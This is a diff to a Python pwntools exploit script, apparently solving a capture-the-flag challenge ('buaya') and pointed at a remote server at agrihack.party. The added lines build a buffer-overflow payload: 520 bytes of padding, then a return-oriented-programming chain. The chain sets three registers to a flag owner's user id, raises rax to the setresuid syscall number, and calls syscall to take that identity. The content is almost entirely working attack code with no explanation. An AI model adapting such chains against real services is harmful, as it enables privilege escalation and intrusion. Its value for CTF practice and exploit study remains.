@@ -48,8 +48,8 @@ def cetak_papan():
 				kirim = str(i) + " " + str(j)
 				a.sendline(kirim)
 
-# a = remote('agrihack.party', 30303)
-a = process('./buaya')
+a = remote('agrihack.party', 30103)
+# a = process('./buaya')
 print a.recvuntil('Ayo selesaikan 20 alokasi penangkarannya. Kamu akan dapat hadiah jika berhasil.')
 for i in range(20):
 	hasil = a.recvuntil('meter persegi')
@@ -64,6 +64,18 @@ print a.recvuntil('tas kulit buaya')
 
 # Padding goes here
 p = 'a'*520
+
+p += pack('<Q', 0x00401b66) # : pop rdi; ret
+p += p64(0x237c) # isi dengan id yang punya flagnya
+p += pack('<Q', 0x00401c87) # pop rsi ; ret
+p += p64(0x237c) # isi dengan id yang punya flagnya
+p += pack('<Q', 0x00443ef6) # pop rdx; ret
+p += p64(0x237c) # isi dengan id yang punya flagnya
+
+p += pack('<Q', 0x0046f9b0) # mov rax, 1
+for i in range(116):
+	p += pack('<Q', 0x0046f980) # add rax, 1
+p += pack('<Q', 0x00000000004706e5) # syscall ; ret
 
 p += pack('<Q', 0x0000000000401c87) # pop rsi ; ret
 p += pack('<Q', 0x00000000006cc080) # @ .data
